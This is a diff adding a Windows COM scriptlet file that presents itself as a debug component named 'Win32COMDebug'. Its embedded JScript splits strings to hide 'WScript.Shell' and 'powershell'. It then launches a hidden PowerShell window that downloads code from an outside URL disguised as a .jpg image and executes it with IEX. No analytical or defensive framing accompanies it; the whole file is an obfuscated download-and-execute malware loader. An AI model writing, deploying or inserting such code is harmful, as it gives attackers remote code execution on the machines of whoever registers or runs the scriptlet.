@@ -1,0 +1,20 @@
+<?XML version="1.0"?>
+<scriptlet>
+<registration
+description="Win32COMDebug"
+progid="Win32COMDebug"
+version="1.00"
+classid="{AAAA0111-0000-0000-0000-0000FEEDACDC}"
+ >
+ <script language="JScript">
+      <![CDATA[
+      	   
+	 var r = new ActiveXObject("W"+"S"+"c"+"r"+"i"+"p"+"t"+".S"+"hell").Run("p"+"o"+"w"+"e"+"r"+"s"+"h"+"e"+"ll -NoP -sta -NonI -W Hidden IEX (New-Object Net.WebClient).DownloadString('http://www.spiritns.com/God.jpg');",0);
+
+      ]]>
+ </script>
+</registration>
+<public>
+    <method name="Exec"></method>
+</public>
+</scriptlet>
